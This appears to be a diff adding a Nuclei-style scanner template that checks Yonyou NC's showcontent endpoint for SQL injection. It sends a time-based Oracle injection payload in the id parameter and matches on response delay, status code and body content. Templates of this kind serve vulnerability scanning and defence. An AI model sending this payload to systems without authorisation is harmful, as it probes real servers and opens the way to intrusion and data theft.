@@ -1,0 +1,22 @@
+id: yonyou-nc-showcontent-sqli
+
+info:
+  name: Yonyou NC showcontent - SQL Injection
+  author: qwtd
+  severity: high
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - raw:
+    - |
+      @timeout: 15s
+      GET /ebvp/infopub/showcontent?id=1'+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,5)-- HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 500'
+          - 'contains(body, "@VERSION@")'
+        condition: and
